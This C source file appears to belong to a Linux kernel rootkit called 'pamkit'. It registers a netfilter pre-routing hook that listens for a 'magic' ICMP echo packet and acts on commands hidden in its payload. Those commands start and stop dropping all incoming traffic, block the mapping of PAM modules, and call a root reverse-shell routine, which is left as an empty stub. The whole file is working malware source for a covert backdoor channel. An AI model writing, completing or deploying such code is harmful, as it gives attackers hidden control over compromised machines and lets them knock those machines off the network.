/**
 * Register a netfilter hook that looks for a magic packet.
*/

#include "net.h"

int drop_everything = 0;
static struct nf_hook_ops *magic_packet_listener = NULL;


static inline unsigned char
_ip_header_len_bytes(struct iphdr *ip_header)
{
    return ip_header->ihl << 2;
}

/**
 *  Checks whether or not the given packet is a magic-packet.
 */
static int
_check_magic_packet(struct sk_buff *skb)
{
    if (!skb) {
        return 0;
    }

    struct iphdr *ip_header = ip_hdr(skb);
    struct icmphdr *icmp_header = icmp_hdr(skb);

    if (!ip_header || IS_ERR(ip_header)) {
        return 0;
    }

    if (ip_header->protocol != IPPROTO_ICMP) {
        //not a ICMP packet.
        return 0;
    }

    
    if (!(icmp_header->type == ICMP_ECHO && icmp_header->code == 0x00)) {
        //not a (valid) ICMP ECHO request packet.
        return 0;
    }

    if ((ntohs(icmp_header->un.echo.id) != MAGIC_ID) ||
            (ntohs(icmp_header->un.echo.sequence) != MAGIC_SEQ_NR)) {
        //packet ID and sequence number do not correspond to the magic numbers.
        return 0;
    }
    return 1;
}

static char *
_magic_content(struct sk_buff *skb)
{
    struct iphdr *ip_header = ip_hdr(skb);
    unsigned char ip_hdr_len = _ip_header_len_bytes(ip_header);

    char *data = (char *) (skb->data + ip_hdr_len + PAMKIT_ICMP_DATA);

    return data;
}

static void
_spawn_root_rev_shell(void)
{
    //evtl. hinzufügen.
}

static unsigned int
_do_magic(struct sk_buff *skb)
{
    char *command = _magic_content(skb);

    if (!strncmp(command, START_DOS, START_DOS_SIZE)) {
        drop_everything = 1;
        return NF_DROP;
    } else if (!strncmp(command, END_DOS, END_DOS_SIZE)) {
        drop_everything = 0;
        return NF_DROP;
    } else if (!strncmp(command, DO_REV_SHELL, DO_REV_SHELL_SIZE)) {
        _spawn_root_rev_shell();
        return NF_DROP;
    } else {
        //invalid command -> do nothing.
        return NF_ACCEPT;
    }
}

static unsigned int
nf_callback(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
     /**
     * Look for the magic packet (ICMP ECHO request with ID=200 and SEQ=200)
     * 
     * pamkit-start:    sets a flag that instructs the mmap hook to prohibit the mapping of PAM modules and drops all incoming IP packets.
     * 
     * pamkit-end:      allow mapping of PAM modules and don't drop any packets.
     * 
     */

    if (drop_everything) {
        if (_check_magic_packet(skb)) {
            _do_magic(skb);
        }
        return NF_DROP;
    }

    if (_check_magic_packet(skb)) {
        //Check if the packets contains a recognized command.
        return _do_magic(skb);
    }
    return NF_ACCEPT;
}

int
add_netfilter_hook(void)
{
    /**
     * Add the callback function to the pre-routing hook in the IPv4 stack.
     */

    int ret = 0;

    magic_packet_listener = (struct nf_hook_ops *) kzalloc(sizeof(struct nf_hook_ops), GFP_KERNEL);
    if (!magic_packet_listener) {
        return -ENOMEM;
    }

    magic_packet_listener->hook = nf_callback;
    magic_packet_listener->pf = PF_INET;
    magic_packet_listener->priority = NF_IP_PRI_FIRST;
    magic_packet_listener->hooknum = NF_INET_PRE_ROUTING;


    #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
    ret = nf_register_net_hook(&init_net, magic_packet_listener);
    #else
    ret = nf_register_hook(magic_packet_listener);
    #endif

    pr_debug("Added netfilter hook\n");

    return ret;
}

void
remove_netfilter_hook(void)
{
    /**
     * Remove the registered hook.
     */

    if (!magic_packet_listener) { //hook not created
        return;
    }

    #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
    nf_unregister_net_hook(&init_net, magic_packet_listener);
    #else
    nf_unregister_hook(magic_packet_listener);
    #endif

    kfree(magic_packet_listener);
    magic_packet_listener = NULL;

    pr_debug("Removed netfilter hook\n");
}
